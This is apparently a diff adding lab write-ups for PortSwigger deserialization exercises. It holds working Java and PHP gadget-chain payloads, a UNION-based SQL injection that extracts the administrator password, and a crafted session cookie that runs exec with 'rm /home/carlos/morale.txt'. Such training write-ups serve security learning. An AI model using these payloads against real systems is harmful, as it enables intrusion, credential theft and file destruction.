@@ -235,3 +235,246 @@ index.rb:19:in \`\<main>': Invalid access token for user carlos (RuntimeError)
 **Solution:**
 
 **`$ ruby rubyDeserialization.rb -> Session Cookie value`**
+
+### Lab: Developing a custom gadget chain for Java deserialization
+
+This lab uses a serialization-based session mechanism. If you can construct a suitable gadget chain, you can exploit this lab's insecure deserialization to obtain the administrator's password.
+
+To solve the lab, gain access to the source code and use it to construct a gadget chain to obtain the administrator's password. Then, log in as the administrator and delete Carlos's account.
+
+```
+POST /login HTTP/1.1
+
+HTTP/1.1 302 Found
+Location: /my-account
+Set-Cookie: session=rO0ABXNyACJkYXRhLnNlc3Npb24udG9rZW4uQWNjZXNzVG9rZW5Vc2Vyc1%2bhUBRJ0u8CAAJMAAthY2Nlc3NUb2tlbnQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACHVzZXJuYW1lcQB%2bAAF4cHQAIGZuajZvZ3ZoMzFlOHVweTQ0aXRsYmN1MTZvYWhrYnFwdAAGd2llbmVy; Secure; HttpOnly; SameSite=None
+Connection: close
+Content-Length: 0
+```
+
+```
+<!-- <a href=/backup/AccessTokenUser.java>Example user</a> -->
+
+package data.session.token;
+
+import java.io.Serializable;
+
+public class AccessTokenUser implements Serializable
+{
+    private final String username;
+    private final String accessToken;
+
+    public AccessTokenUser(String username, String accessToken)
+    {
+        this.username = username;
+        this.accessToken = accessToken;
+    }
+
+    public String getUsername()
+    {
+        return username;
+    }
+
+    public String getAccessToken()
+    {
+        return accessToken;
+    }
+}
+```
+
+```
+/backup/ProductTemplate.java
+
+package data.productcatalog;
+
+import common.db.ConnectionBuilder;
+
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.Serializable;
+import java.sql.Connection;
+import java.sql.ResultSet;
+import java.sql.SQLException;
+import java.sql.Statement;
+
+public class ProductTemplate implements Serializable
+{
+    static final long serialVersionUID = 1L;
+
+    private final String id;
+    private transient Product product;
+
+    public ProductTemplate(String id)
+    {
+        this.id = id;
+    }
+
+    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
+    {
+        inputStream.defaultReadObject();
+
+        ConnectionBuilder connectionBuilder = ConnectionBuilder.from(
+                "org.postgresql.Driver",
+                "postgresql",
+                "localhost",
+                5432,
+                "postgres",
+                "postgres",
+                "password"
+        ).withAutoCommit();
+        try
+        {
+            Connection connect = connectionBuilder.connect(30);
+            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
+            Statement statement = connect.createStatement();
+            ResultSet resultSet = statement.executeQuery(sql);
+            if (!resultSet.next())
+            {
+                return;
+            }
+            product = Product.from(resultSet);
+        }
+        catch (SQLException e)
+        {
+            throw new IOException(e);
+        }
+    }
+
+    public String getId()
+    {
+        return id;
+    }
+
+    public Product getProduct()
+    {
+        return product;
+    }
+}
+```
+
+ProductTemplate.readObject() method passes the template's id attribute into a SQL statement.
+
+String sql = String.format("SELECT \* FROM products WHERE id = '%s' LIMIT 1", id);
+
+There is a SQL Inj point.
+
+[https://github.com/PortSwigger/serialization-examples/blob/master/java/solution/Main.java](https://github.com/PortSwigger/serialization-examples/blob/master/java/solution/Main.java)
+
+```
+$ sudo apt install openjdk-17-jdk
+
+$ javac Main.java
+$ java Main          
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAASc=
+Deserialized object ID: '
+
+The error message confirms that the website is vulnerable to Postgres-based SQL injection via this deserialized object.
+
+- Enumerate the number of columns in the table (8).
+- Determine the data type of the columns and identify that columns 4, 5, and 6 do not expect values of the type string. Importantly, notice that the error message reflects the string input that you entered.
+- List the contents of the database and identify that there is a table called users with a column called password.
+
+$ javac Main.java
+$ java Main 
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAXycgVU5JT04gU0VMRUNUIE5VTEwsIE5VTEwsIE5VTEwsIENBU1QocGFzc3dvcmQgQVMgbnVtZXJpYyksIE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwgRlJPTSB1c2Vycy0t
+Deserialized object ID: ' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--
+
+<p class=is-warning>
+org.apache.commons.lang3.SerializationException: 
+java.io.IOException: org.postgresql.util.PSQLException: 
+ERROR: invalid input syntax for type numeric: &quot;j8pqu2mxfs22wimc3u04&quot;
+</p>
+```
+
+**administrator:j8pqu2mxfs22wimc3u04**
+
+### Lab: Developing a custom gadget chain for PHP deserialization
+
+This lab uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its insecure deserialization to achieve remote code execution. To solve the lab, delete the morale.txt file from Carlos's home directory.
+
+```
+<!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated -->
+
+/cgi-bin/libs/CustomTemplate.php~
+
+<?php
+
+class CustomTemplate {
+    private $default_desc_type;
+    private $desc;
+    public $product;
+
+    public function __construct($desc_type='HTML_DESC') {
+        $this->desc = new Description();
+        $this->default_desc_type = $desc_type;
+        // Carlos thought this is cool, having a function called in two places... What a genius
+        $this->build_product();
+    }
+
+    public function __sleep() {
+        return ["default_desc_type", "desc"];
+    }
+
+    public function __wakeup() {
+        $this->build_product();
+    }
+
+    private function build_product() {
+        $this->product = new Product($this->default_desc_type, $this->desc);
+    }
+}
+
+class Product {
+    public $desc;
+
+    public function __construct($default_desc_type, $desc) {
+        $this->desc = $desc->$default_desc_type;
+    }
+}
+
+class Description {
+    public $HTML_DESC;
+    public $TEXT_DESC;
+
+    public function __construct() {
+        // @Carlos, what were you thinking with these descriptions? Please refactor!
+        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
+        $this->TEXT_DESC = 'This product is cool in text';
+    }
+}
+
+class DefaultMap {
+    private $callback;
+
+    public function __construct($callback) {
+        $this->callback = $callback;
+    }
+
+    public function __get($name) {
+        return call_user_func($this->callback, $name);
+    }
+}
+
+?>
+```
+
+```
+Set-Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6
+InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJmdDE1YW10M3dzZXAxcmMwYzZ2Nm1teThvNmJoa2l2ciI7fQ%3d%3d
+```
+
+`#Decoded O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ft15amt3wsep1rc0c6v6mmy8o6bhkivr";}`
+
+```
+CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt";
+CustomTemplate->desc = DefaultMap;
+DefaultMap->callback = "exec"
+```
+
+```
+Cookie: session=TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MTc6ImRlZmF1bHRfZGVzY190eXBlIjtzOjI2OiJybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7czo0OiJkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjg6ImNhbGxiYWNrIjtzOjQ6ImV4ZWMiO319
+```
+
+`#Decoded O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}`
